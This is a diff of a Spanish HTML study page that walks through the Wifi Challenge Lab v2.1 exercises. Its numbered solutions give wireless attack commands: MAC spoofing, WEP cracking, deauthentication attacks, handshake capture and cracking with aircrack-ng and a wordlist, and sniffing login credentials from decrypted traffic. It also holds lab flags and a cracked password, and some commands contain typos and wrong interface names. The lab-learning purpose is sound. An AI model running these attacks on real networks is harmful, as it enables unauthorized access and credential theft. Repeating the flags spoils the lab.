@@ -1,305 +1,320 @@
 <!DOCTYPE html>
 <html lang="es">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Apuntes de Wifi</title>
+        <link rel="icon" type="image/png" href="../../img/pezEjecutivo.png" />
+        <link rel="stylesheet" href="./styles.css" />
+    </head>
 
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Apuntes de Wifi</title>
-    <link rel="icon" type="image/png" href="../../img/pezEjecutivo.png" />
-    <link rel="stylesheet" href="./styles.css" />
-</head>
+    <body>
+        <!-- Contenedor principal -->
+        <div class="page-container">
+            <!-- Cabecera -->
+            <header>
+                <!-- Botón para volver al índice principal -->
+                <a href="../index.html" class="back-button">← Volver al índice</a>
+                <a href="../../index.html"
+                    ><img src="../../img/pezEjecutivo.png" alt="Pez Ejecutivo" class="header-image left-image"
+                /></a>
+                <h1>Apuntes de Wifi</h1>
+                <p>Apuntes creados por Pablo Valladares González.</p>
+                <button id="theme-toggle">🌙</button>
+            </header>
 
-<body>
-    <!-- Contenedor principal -->
-    <div class="page-container">
-        <!-- Cabecera -->
-        <header>
-            <!-- Botón para volver al índice principal -->
-            <a href="../index.html" class="back-button">← Volver al índice</a>
-            <a href="../../index.html"><img src="../../img/pezEjecutivo.png" alt="Pez Ejecutivo"
-                    class="header-image left-image" /></a>
-            <h1>Apuntes de Wifi</h1>
-            <p>Apuntes creados por Pablo Valladares González.</p>
-            <button id="theme-toggle">🌙</button>
-        </header>
+            <!-- Contenido principal -->
+            <main class="container">
+                <!-- Sección de apuntes -->
+                <section class="notes-section">
+                    <h2>Wifi Challenge Lab v2.1</h2>
 
-        <!-- Contenido principal -->
-        <main class="container">
-            <!-- Sección de apuntes -->
-            <section class="notes-section">
-                <h2>Wifi Challenge Lab v2.1</h2>
-
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>00. What is the contents of the file /root/flag.txt on the VM?</h3>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>00. What is the contents of the file /root/flag.txt on the VM?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p><b>cat:</b> Comando para leer archivos</p>
+                            <pre>cat /root/flag.txt</pre>
+                        </div>
                     </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p><b>cat:</b> Comando para leer archivos</p>
-                        <pre>cat /root/flag.txt</pre>
-                    </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>01. What is the channel that the wifi-global Access Point is currently using?</h3>
-                    </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p>
-                            <b>airmon-ng start wlan0:</b> Pone la interfaz de red (wlan0) en modo promiscuo/monitor
-                        </p>
-                        <p>
-                            <b>airodump-ng wlan0mon --band abg:</b> Captura/Muestra el trafico de todas las wifis
-                            cercanas incluidas las de 5GHz
-                        </p>
-                        <pre>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>01. What is the channel that the wifi-global Access Point is currently using?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>airmon-ng start wlan0:</b> Pone la interfaz de red (wlan0) en modo promiscuo/monitor
+                            </p>
+                            <p>
+                                <b>airodump-ng wlan0mon --band abg:</b> Captura/Muestra el trafico de todas las wifis
+                                cercanas incluidas las de 5GHz
+                            </p>
+                            <pre>
 airmong-ng start wlan0
-airodump-ng wlan0mon --band abg</pre>
+airodump-ng wlan0mon --band abg</pre
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>02. What is the MAC of the wifi-IT client? using?</h3>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>02. What is the MAC of the wifi-IT client? using?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>airodump-ng wlan0mon --channel 11:</b> Captura/Muestra el trafico de las redes en los
+                                canales 11
+                            </p>
+                            <pre>airodump-ng wlan0mon --channel 11</pre>
+                        </div>
                     </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p>
-                            <b>airodump-ng wlan0mon --channel 11:</b> Captura/Muestra el trafico de las redes en los
-                            canales 11
-                        </p>
-                        <pre>airodump-ng wlan0mon --channel 11</pre>
-                    </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>03. What is the probe of 78:C1:A7:BF:72:46?</h3>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>03. What is the probe of 78:C1:A7:BF:72:46?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>airodump-ng wlan0mon --band abg:</b> Captura/Muestra el trafico de las redes en las
+                                bandas de 2,4GHz y 5GHz
+                            </p>
+                            <pre>airodump-ng wlan0mon --band abg</pre>
+                        </div>
                     </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p>
-                            <b>airodump-ng wlan0mon --band abg:</b> Captura/Muestra el trafico de las redes en las
-                            bandas de 2,4GHz y 5GHz
-                        </p>
-                        <pre>airodump-ng wlan0mon --band abg</pre>
-                    </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>04. What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)?</h3>
-                    </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p>
-                            <b>sed -i 's/\b\w\+/wifi-&/g' rockyouModificado.txt</b> Para añadir "wifi-" al principio
-                            de cada palabra
-                        </p>
-                        <p>
-                            <b>iwconfig wlan0mon channel 11:</b> Cambia el canal de la interfaz de red (wlan0mon) al
-                            canal 11
-                        </p>
-                        <p>
-                            <b>mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f rockyoumodificado.txt:</b> Consigue el nombre
-                            del wifi con dicha MAC (F0:9F:C2:6A:88:26) a partir de la lista (rockyoumodificado.txt)
-                        </p>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>04. What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>sed -i 's/\b\w\+/wifi-&/g' rockyouModificado.txt</b> Para añadir "wifi-" al principio
+                                de cada palabra
+                            </p>
+                            <p>
+                                <b>iwconfig wlan0mon channel 11:</b> Cambia el canal de la interfaz de red (wlan0mon) al
+                                canal 11
+                            </p>
+                            <p>
+                                <b>mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f rockyoumodificado.txt:</b> Consigue el nombre
+                                del wifi con dicha MAC (F0:9F:C2:6A:88:26) a partir de la lista (rockyoumodificado.txt)
+                            </p>
 
-                        <pre>
+                            <pre>
 sed -i 's/\b\w\+/wifi-&/g' rockyouModificado.txt
 iwconfig wlan0mon channel 11
-mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f rockyoumodificado.txt</pre>
+mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f rockyoumodificado.txt</pre
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>05. What is the flag in the hidden AP router behind default credentials?</h3>
-                    </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p>
-                            <b>nano wifi.conf:</b> Para crear un archivo de configuración del wifi, cuyo archivo
-                            contiene
-                        </p>
-                        <pre>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>05. What is the flag in the hidden AP router behind default credentials?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>nano wifi.conf:</b> Para crear un archivo de configuración del wifi, cuyo archivo
+                                contiene
+                            </p>
+                            <pre>
 network={
     ssid="wifi-free"
     key_mgmt=NONE
     scan_ssid=1
-}</pre>
-                        <p>
-                            <b>wpa_supplicant -Dnl80211 -iwlan1 -c wifi.conf:</b> Para conectarse a la red wifi con
-                            dicha interfaz (wlan1)
-                        </p>
-                        <p><b>dhclient wlan1 -v:</b> Para obtener una IP en dicha interfaz (wlan1)</p>
-                        <pre>
+}</pre
+                            >
+                            <p>
+                                <b>wpa_supplicant -Dnl80211 -iwlan1 -c wifi.conf:</b> Para conectarse a la red wifi con
+                                dicha interfaz (wlan1)
+                            </p>
+                            <p><b>dhclient wlan1 -v:</b> Para obtener una IP en dicha interfaz (wlan1)</p>
+                            <pre>
 wpa_supplicant -Dnl80211 -iwlan1 -c wifi-free.conf
 dhclient wlan1 -v                                
-</pre>
+</pre
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>06. What is the flag on the AP router of the wifi-guest network?</h3>
-                    </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p><b>ip link set wlan2 down:</b> Para apagar dicha interfaz (wlan2)</p>
-                        <p><b>macchanger -m MAC wlan2:</b> Para cambiar la MAC a la interfaz (wlan2) apagada</p>
-                        <p><b>ip link set wlan2 up:</b> Para encender dicha interfaz (wlan2)</p>
-                        <p>
-                            <b>nano wifi.conf:</b> Para crear un archivo de configuración del wifi, cuyo archivo
-                            contiene
-                        </p>
-                        <pre>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>06. What is the flag on the AP router of the wifi-guest network?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p><b>ip link set wlan2 down:</b> Para apagar dicha interfaz (wlan2)</p>
+                            <p><b>macchanger -m MAC wlan2:</b> Para cambiar la MAC a la interfaz (wlan2) apagada</p>
+                            <p><b>ip link set wlan2 up:</b> Para encender dicha interfaz (wlan2)</p>
+                            <p>
+                                <b>nano wifi.conf:</b> Para crear un archivo de configuración del wifi, cuyo archivo
+                                contiene
+                            </p>
+                            <pre>
 network={
     ssid="wifi-guest"
     key_mgmt=NONE
     scan_ssid=1
-}</pre>
-                        <p>
-                            Necesitaremos tener una captura de la red, donde podamos filtrar por el puerto 80 para
-                            sacar las credenciales
-                        </p>
-                        <p>
-                            <b>wpa_supplicant -Dnl80211 -iwlan2 -c wifi.conf:</b> Para conectarse a la red wifi con
-                            dicha interfaz (wlan1)
-                        </p>
-                        <p><b>dhclient wlan2 -v:</b> Para obtener una IP en dicha interfaz (wlan2)</p>
-                        <pre>
+}</pre
+                            >
+                            <p>
+                                Necesitaremos tener una captura de la red, donde podamos filtrar por el puerto 80 para
+                                sacar las credenciales
+                            </p>
+                            <p>
+                                <b>wpa_supplicant -Dnl80211 -iwlan2 -c wifi.conf:</b> Para conectarse a la red wifi con
+                                dicha interfaz (wlan1)
+                            </p>
+                            <p><b>dhclient wlan2 -v:</b> Para obtener una IP en dicha interfaz (wlan2)</p>
+                            <pre>
 wpa_supplicant -Dnl80211 -iwlan2 -c wifi.conf
-dhclient wlan1 -v</pre>
+dhclient wlan1 -v</pre
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <!-- Tarjeta expandible -->
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>07. What is the flag on the wifi-old AP website?</h3>
-                    </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p><b>besside-ng -b MAC wlan0mon:</b> Para conseguir la contraseña del wifi de dicha MAC</p>
-                        <p>
-                            <b>nano wifi.conf:</b> Para crear un archivo de configuración del wifi, cuyo archivo
-                            contiene
-                        </p>
-                        <pre>
+                    <!-- Tarjeta expandible -->
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>07. What is the flag on the wifi-old AP website?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p><b>besside-ng -b MAC wlan0mon:</b> Para conseguir la contraseña del wifi de dicha MAC</p>
+                            <p>
+                                <b>nano wifi.conf:</b> Para crear un archivo de configuración del wifi, cuyo archivo
+                                contiene
+                            </p>
+                            <pre>
 network={
     ssid="wifi-old"
     key_mgmt=NONE
 	wep_key0=11bb33cd55
 	wep_tx_keyidx=0
-}</pre>
-                        <p>
-                            <b>wpa_supplicant -Dnl80211 -iwlan3 -c wifi.conf:</b> Para conectarse a la red wifi con
-                            dicha interfaz (wlan1)
-                        </p>
-                        <p><b>dhclient wlan3 -v:</b> Para obtener una IP en dicha interfaz (wlan3)</p>
-                        <pre>
+}</pre
+                            >
+                            <p>
+                                <b>wpa_supplicant -Dnl80211 -iwlan3 -c wifi.conf:</b> Para conectarse a la red wifi con
+                                dicha interfaz (wlan1)
+                            </p>
+                            <p><b>dhclient wlan3 -v:</b> Para obtener una IP en dicha interfaz (wlan3)</p>
+                            <pre>
 wpa_supplicant -Dnl80211 -iwlan2 -c wifi.conf
-dhclient wlan1 -v</pre>
+dhclient wlan1 -v</pre
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <!-- Otras tarjetas expandibles -->
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>08. What is the wifi-mobile AP password?</h3>
-                    </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p>
-                            <b>airodump-ng wlan0mon -c 6 --wps -w scan8:</b> Captura/Muestra el trafico de las redes
-                            en el canal 6 y lo guarda en archivos llamados scan8.
-                        </p>
-                        <p>
-                            <b>aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon:</b> Hace un ataque de Deauth 10
-                            veces para obtener la contraseña de cuando se conecten, es importante hacer esto
-                            mientras se esta realizando la captura.
-                        </p>
+                    <!-- Otras tarjetas expandibles -->
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>08. What is the wifi-mobile AP password?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>airodump-ng wlan0mon -c 6 --wps -w scan8:</b> Captura/Muestra el trafico de las redes
+                                en el canal 6 y lo guarda en archivos llamados scan8.
+                            </p>
+                            <p>
+                                <b>aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon:</b> Hace un ataque de Deauth 10
+                                veces para obtener la contraseña de cuando se conecten, es importante hacer esto
+                                mientras se esta realizando la captura.
+                            </p>
 
-                        <p>
-                            <b>aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt:</b> Conseguimos la
-                            contraseña del wifi mediante la captura anteriomente conseguida y una lista de palabras
-                        </p>
-                        <pre>
+                            <p>
+                                <b>aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt:</b> Conseguimos la
+                                contraseña del wifi mediante la captura anteriomente conseguida y una lista de palabras
+                            </p>
+                            <pre>
 airodump-ng wlan0mon -c 6 --wps -w scan8
 aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
-aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt</pre>
+aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt</pre
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>09. What is the IP of the web server in the wifi-mobile network?</h3>
-                    </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p>
-                            <b>airodump-ng wlan0mon -c 6 --wps -w scan9:</b> Captura/Muestra el trafico de las redes
-                            en el canal 6 y lo guarda en archivos llamados scan9.
-                        </p>
-                        <p> <b>aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon:</b> Hace que se desconecte la gente para
-                            poder capturar los paquetes de login</p>
-                        <p>
-                            <b>airdecap-ng -e wifi-mobile -p starwars1 scan9-01.cap:</b> Captura y desencripta el
-                            trafico wifi a la vez, utilizando la contraseña y ssid introducido (starwars1,
-                            wifi-mobile)
-                        </p>
-                        <p><b>wireshark scan9-01-dec.cap:</b> Abrimos la captura de trafico con wireshark</p>
-                        <pre>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>09. What is the IP of the web server in the wifi-mobile network?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>airodump-ng wlan0mon -c 6 --wps -w scan9:</b> Captura/Muestra el trafico de las redes
+                                en el canal 6 y lo guarda en archivos llamados scan9.
+                            </p>
+                            <p>
+                                <b>aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon:</b> Hace que se desconecte la gente
+                                para poder capturar los paquetes de login
+                            </p>
+                            <p>
+                                <b>airdecap-ng -e wifi-mobile -p starwars1 scan9-01.cap:</b> Captura y desencripta el
+                                trafico wifi a la vez, utilizando la contraseña y ssid introducido (starwars1,
+                                wifi-mobile)
+                            </p>
+                            <p><b>wireshark scan9-01-dec.cap:</b> Abrimos la captura de trafico con wireshark</p>
+                            <pre>
 airodump-ng wlan0mon -c 6 --wps -w scan9
+aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
+
 airdecap-ng -e wifi-mobile -p starwars1 scan9-01.cap
 wireshark  scan9-01-dec.cap
 
-En wireshark buscaremos todas las peeticiones que tengan como destino puerto 80, ya que el servidor web se aloja en el puerto 80 de manera habitual.</pre>
+En wireshark buscaremos todas las peeticiones que tengan como destino puerto 80, ya que el servidor web se aloja en el puerto 80 de manera habitual.</pre
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>10. what is the flag after login in wifi-mobile?</h3>
-                    </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p>
-                            <b>airodump-ng wlan0mon -c 6 --wps -w scan10:</b> Captura/Muestra el trafico de las
-                            redes en el canal 6 y lo guarda en archivos llamados scan10.
-                        </p>
-                        <p>
-                            <b>aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon:</b> Captura y desencripta el trafico
-                            wifi a la vez, utilizando la contraseña y ssid introducido (starwars1, wifi-mobile)
-                        </p>
-                        <p>
-                            <b>aircrack-ng scan10-01.cap -w /root/rockyou-top100000.txt:</b> Abrimos la captura de
-                            trafico con wireshark
-                        </p>
-                        <p>
-                            <b>airdecap-ng -e wifi-mobile -p starwars1 scan10-01.cap:</b> Abrimos la captura de
-                            trafico con wireshark
-                        </p>
-                        <p>
-                            <b>nano wifi.conf:</b> Para crear un archivo de configuración del wifi, cuyo archivo
-                            contiene
-                        </p>
-                        <pre>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>10. what is the flag after login in wifi-mobile?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>airodump-ng wlan0mon -c 6 --wps -w scan10:</b> Captura/Muestra el trafico de las
+                                redes en el canal 6 y lo guarda en archivos llamados scan10.
+                            </p>
+                            <p>
+                                <b>aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon:</b> Captura y desencripta el trafico
+                                wifi a la vez, utilizando la contraseña y ssid introducido (starwars1, wifi-mobile)
+                            </p>
+                            <p>
+                                <b>aircrack-ng scan10-01.cap -w /root/rockyou-top100000.txt:</b> Obtenemos la contraseña
+                                de dicha red
+                            </p>
+                            <p>
+                                <b>airdecap-ng -e wifi-mobile -p starwars1 scan10-01.cap:</b> Abrimos la captura de
+                                trafico con wireshark
+                            </p>
+                            <p>
+                                <b>nano wifi.conf:</b> Para crear un archivo de configuración del wifi, cuyo archivo
+                                contiene
+                            </p>
+                            <pre>
 network={
     ssid="wifi-mobile"
     psk="starwars1"
     key_mgmt=WPA-PSK
     proto=WPA2
-}</pre>
-                        <p>
-                            <b>wpa_supplicant -Dnl80211 -iwlan4 -c wifi.conf:</b> Para conectarse a la red wifi con
-                            dicha interfaz (wlan1)
-                        </p>
-                        <p><b>dhclient wlan4 -v:</b> Para obtener una IP en dicha interfaz (wlan3)</p>
-                        <p><b>wireshark scan10-01-dec.cap</b></p>
-                        <pre>
+}</pre
+                            >
+                            <p>
+                                <b>wpa_supplicant -Dnl80211 -iwlan4 -c wifi.conf:</b> Para conectarse a la red wifi con
+                                dicha interfaz (wlan1)
+                            </p>
+                            <p><b>dhclient wlan4 -v:</b> Para obtener una IP en dicha interfaz (wlan3)</p>
+                            <p><b>wireshark scan10-01-dec.cap</b></p>
+                            <pre>
 airodump-ng wlan0mon -c 6 --wps -w scan10
 aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
 aircrack-ng scan10-01.cap -w /root/rockyou-top100000.txt
@@ -309,70 +324,67 @@ wpa_supplicant -Dnl80211 -iwlan4 -c wifi.conf
 dhclient wlan4 -v
 wireshark  scan9-01-dec.cap
 
-En wireshark buscaremos todas las peticiones que tengan como destino puerto 80, ya que el servidor web se aloja en el puerto 80 de manera habitual.</pre>
+En wireshark buscaremos todas las peticiones que tengan como destino puerto 80, ya que el servidor web se aloja en el puerto 80 de manera habitual.</pre
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>11. Is there client isolation in the wifi-mobile network?</h3>
-                    </div>
-                    <div class="card-content">
-                        <p>Los comandos utilizados han sido:</p>
-                        <p>
-                            <b>arp-scan -I wlan4 -l:</b> detecta dispositivos en la red
-                        </p>
-                        <p>
-                            <b>curl 192.168.2.7:</b> manda una petición get a dicha IP
-                        </p>
-                        <pre>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>11. Is there client isolation in the wifi-mobile network?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p><b>arp-scan -I wlan4 -l:</b> detecta dispositivos en la red</p>
+                            <p><b>curl 192.168.2.7:</b> manda una petición get a dicha IP</p>
+                            <pre>
 arp-scan -I wlan4 -l
-curl 192.168.2.7</pre>
+curl 192.168.2.7</pre
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <div class="expandable-card">
-                    <div class="card-header" onclick="toggleCard(this)">
-                        <h3>En progreso...</h3>
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>En progreso...</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Agradecemos su espera</p>
+                            <pre>flag{60223747c5360c8d3203917998f37d28}</pre>
+                        </div>
                     </div>
-                    <div class="card-content">
-                        <p>Agradecemos su espera</p>
-                        <pre>flag{60223747c5360c8d3203917998f37d28}</pre>
-                    </div>
-                </div>
 
-                <!-- Más tarjetas aquí -->
-            </section>
-        </main>
+                    <!-- Más tarjetas aquí -->
+                </section>
+            </main>
 
-        <!-- Pie de página -->
-        <footer>
-            <p>Pablo Valladares González &copy; 2025 Apuntes de CETI. Todos los derechos reservados.</p>
-        </footer>
-    </div>
-
-    <!-- Disclaimer -->
-    <div id="disclaimer" class="disclaimer">
-        <div class="disclaimer-header">
-            <h3>Advertencia</h3>
-            <button id="close-disclaimer" class="close-button">×</button>
+            <!-- Pie de página -->
+            <footer>
+                <p>Pablo Valladares González &copy; 2025 Apuntes de CETI. Todos los derechos reservados.</p>
+            </footer>
         </div>
-        <div class="disclaimer-line"></div>
-        <p>
-            Esta página no promueve o incita a cometer ninguna acción ilegal, todo el contenido proporcionado está
-            diseñado para ser solamente educativo.
-        </p>
-    </div>
 
-    <script>
-        // Función para expandir/colapsar las tarjetas
-        function toggleCard(header) {
-            const card = header.parentElement;
-            const content = card.querySelector(".card-content");
-            content.classList.toggle("expanded");
-        }
-    </script>
-    <script src="../../script.js"></script>
-</body>
+        <!-- Disclaimer -->
+        <div id="disclaimer" class="disclaimer">
+            <div class="disclaimer-header">
+                <h3>Advertencia</h3>
+                <button id="close-disclaimer" class="close-button">×</button>
+            </div>
+            <div class="disclaimer-line"></div>
+            <p>
+                Esta página no promueve o incita a cometer ninguna acción ilegal, todo el contenido proporcionado está
+                diseñado para ser solamente educativo.
+            </p>
+        </div>
 
+        <script>
+            // Función para expandir/colapsar las tarjetas
+            function toggleCard(header) {
+                const card = header.parentElement;
+                const content = card.querySelector(".card-content");
+                content.classList.toggle("expanded");
+            }
+        </script>
+        <script src="../../script.js"></script>
+    </body>
 </html>
